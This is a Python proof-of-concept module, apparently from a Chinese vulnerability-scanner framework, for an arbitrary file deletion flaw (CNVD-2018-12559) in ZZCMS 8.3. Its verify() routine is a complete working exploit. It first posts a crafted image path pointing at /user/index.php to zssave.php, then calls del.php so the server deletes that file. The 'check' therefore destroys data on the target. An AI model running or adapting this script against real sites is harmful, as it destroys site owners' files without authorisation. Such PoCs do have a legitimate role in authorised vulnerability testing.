# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ZZCMS_0002_p'  # 平台漏洞编号，留空
    name = 'ZZCMS任意文件删除漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = '2018-07-04'  # 漏洞公布时间
    desc = '''
        ZZCMS是一款集成app移动平台与电子商务平台的内容管理系统。
        ZZCMS 8.3版本中的/user/del.php文件存在安全漏洞。攻击者可通过向zzcms_main表单中放入相对路径并发送添加图像的请求利用该漏洞删除任意文件。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-12559'  # 漏洞来源
    cnvd_id = 'CNVD-2018-12559'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZZCMS'  # 漏洞应用名称
    product_version = '8.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cd4fb685-2c75-4413-ae8a-a17c1d2af5aa'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://bbs.ichunqiu.com/thread-36589-1-1.html
            payload1 = '/user/zssave.php'
            data1 = "action=add&img=/user/index.php"
            url1 = self.target + payload1
            requests.post(url1, data=data1)

            payload2 = '/user/del.php'
            data2 = "id=5&tablename=zzcms_main"
            url2 = self.target + payload2
            r = requests.post(url2, data=data2)

            if '/user/index.php' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
